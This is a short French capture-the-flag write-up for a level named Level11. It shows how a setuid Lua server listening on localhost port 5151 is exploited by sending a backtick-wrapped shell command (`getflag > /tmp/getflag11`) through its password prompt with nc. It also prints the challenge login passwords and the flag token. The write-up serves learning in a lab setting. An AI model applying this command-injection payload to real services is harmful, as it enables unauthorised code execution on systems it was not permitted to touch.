# Level11

> login:password -> *`level11:feulo4b72j7edeahuete3no7c`*
```
:~$ su level11
Password:feulo4b72j7edeahuete3no7c
```
---

```
:~$ pwd
/home/user/level11
```

```
:~$ ls -la
...
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
...
```

Le Home contient un script lua :

```
:~$ cat level11.lua
...
local server = assert(socket.bind("127.0.0.1", 5151))
...

:~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?

```

On remarque que le serveur est déjà lancé, nous pouvons donc utiliser `nc` ou `telnet`

```
:~$ nc localhost 5151
Password: `getflag > /tmp/getflag11`
Erf nope..

:~$ cat /tmp/getflag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Le flag nous permet de se connecter au level12
`level12:fa6v5ateaw21peobuub8ipe6s`